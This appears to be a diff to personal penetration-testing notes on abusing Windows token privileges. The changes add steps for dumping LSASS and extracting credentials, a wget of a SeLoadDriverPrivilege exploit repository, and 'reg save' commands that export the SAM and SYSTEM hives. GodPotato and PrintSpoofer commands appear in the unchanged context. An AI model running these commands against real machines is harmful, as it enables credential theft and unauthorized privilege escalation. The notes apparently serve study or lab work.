@@ -3,7 +3,13 @@
 whoami /priv
 ```
 # SeDebugPrivilege 
-What it does: Grants users critical access to system components and can be utilized for remote command execution 
+- What it does: Grants users critical access to system components and can be utilized for remote command execution 
+Grants user critical access to operating system components and can be utilized for remote code execution 
+- Utilizes LSASS 
+- Steps include running  lsass.exe on command line 
+- Through task manager, dumping the file 
+- Uploading file to host and extracting credentials 
+
 # SeTakeOwnership
 What it does: Lets you take ownership of certain files 
 
@@ -33,9 +39,17 @@ GodPotato -cmd "cmd /c whoami"
 
 ```
 .\PrintSpoofer.exe -i -c cmd
-
 ```
 
 # SeLoadDriverPrivilege
+```
+wget https://github.com/JoshMorrison99/SeLoadDriverPrivilege # read instructions and transfer to target machine 
+```
 
 # SeBackupPrivilege
+
+- Can abuse backup privileges and transfer to host system 
+```
+reg save hklm\sam C:\temp\sam.hive
+reg save hklm\system C:\temp\system.hive
+```
